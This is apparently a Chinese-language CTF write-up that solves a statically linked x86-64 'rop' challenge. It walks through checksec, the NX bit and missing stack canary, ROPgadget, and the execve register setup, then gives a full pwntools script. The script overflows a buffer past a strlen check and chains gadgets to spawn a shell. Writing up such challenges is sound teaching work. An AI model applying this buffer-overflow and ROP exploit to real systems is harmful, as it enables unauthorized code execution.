---
title: "解 ROP 之工具與詳細流程"
date: 2020-02-17T13:37:01+08:00
draft: false
tags: ["CTF", "pwn"]
categories: ["CTF pwn"]
---

# ROP writeup

## checksec rop

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## file rop

```
rop: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=6608f6b8f49633b8d8248f7665b6ba35659a595a, not stripped
```

## 線索1：statically linked

**動態連結**是當程式執行時，才會去 library binding (.so 或 .dll) <br>
**靜態連結**是指程式在連結階段時，就會將使用到的函式一併放入執行檔

| 比較         | 動態連結     | 靜態連結     |
| ------------ | ------------ | ------------ |
| 連結 library | runtime 階段 | linking 階段 |
| 連結方式     | 建立 GOT 表    | 與執行檔合併 |
| 檔案大小     | 較小         | 較大         |
| libray 檔案類型    |  .so 或 .dll | .a 或 .lib  |

因此我們可使用 **ROPgadget** 在此ELF找出 ROP gadget，來取得 執行權限
```
ROPgadget --binary rop | grep "正規表達式"
```
補充： `grep` 是屬於 BRE 派系，使用正規表達式時，須跳脫字元。


## 線索2：NX is enabled
```
* NX 若關閉，則可寫入 shellcode
* NX 若開啟，則可透過 ROP chain 技巧執行 shell
```

因為 NX 是開啟的，也就是說 data 段是沒有執行能力的。 
因此我們無法使用 shellcode 寫入 data 段，直接執行 shell

然而，我們可以使用 ROP 技巧來執行 shell
我們可透過 `readelf -S 檔案` 指令得知 data段 是可寫入資料的。


### 如何找 data section 位址？
使用 `readelf -S filename` 指令可查看所有 section 的位址
我們只需看 data section的部份即可 <br>

data區段雖然在此程式無法執行，但可寫入 `"/bin/sh"`字串作為納入 shell 參數的暫存區塊
```
readelf -S rop
```
或是
```
readelf -S rop | grep ".data"
```
即可知道 `0x6ca080` 是 data section 位址

![](https://i.imgur.com/b4Z45tn.png)

## 線索3： No canary

使用 r2 反組譯後由於 read 最多可以讀取 0xc8 (200) 個字元，
且輸入到的 local buffer 大小只有 32 bytes，
因此可使用 bof (buffer overflow) 技巧來建立 ROP chain。

![](https://i.imgur.com/Njh4RK9.png)


另外必須要注意，輸入字串後仍會檢查字串長度是否小於等於 32 個，
必須在輸入30個bytes大小的字串後，額外加入 空字元，繞過strlen()的超過長度的判斷，才繼續接 ROP chain

![](https://i.imgur.com/mOn49l6.png)


## ROP chain
ROP = Return Oriented Programming

顧名思義，就是利用 結尾有 ret 的 gadgets (一小段 x86 組語)來湊成我們想要做的事情。

對於 pwn ，我們就是希望可以透過 ROP chain 湊成 `execve("/bin/sh", 0, 0)`，來取得執行 shell 的系統權限。

另外，在撰寫 ROP 時，必須確認該 ELF 是 x86 還是 x64，因為 兩者的 system call 的呼叫（傳參）方式不同

* [參考x64 system call](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/)

### x64呼叫慣例

:::info
rdi: 第一個參數存放的暫存器
rsi: 第二個參數存放的暫存器
rdx: 第三個參數存放的暫存器
:::

舉例來說，呼叫 `execve("/bin/sh", 0, 0)` <br>
暫存器會呈現
```
rax = 0x3b (system call 的編號)
rdi = address of "/bin/sh"
rsi = 0x0
rdx = 0x0
```
只要透過 ROP 將這些暫存器改成上述的值，chain結尾再呼叫 syscall，此程式在overflow之後就會執行 shell 了。

## 解法
```python=
from pwn import *

r = process("./rop")
data_sec = 0x06ca080
gadget1 = 0x04014f6 # pop rdi ; ret
gadget2 = 0x0401617 # pop rsi ; ret
gadget3 = 0x047a712 # mov qword ptr [rdi], rsi ; ret
gadget4 = 0x0442a19 # pop rdx ; pop rsi ; ret
gadget5 = 0x044f6cc # pop rax ; ret
syscall = 0x04003da

rop =  p64(gadget1) + p64(0x06ca080)
rop += p64(gadget2) + "/bin/sh\x00"
rop += p64(gadget3)
rop += p64(gadget4) + p64(0x0)*2
rop += p64(gadget5) + p64(0x3b) 
rop += p64(syscall)

r.recvuntil("\n")
r.send('a'*30+'\x00'+'a'*9 + rop)

r.interactive()
```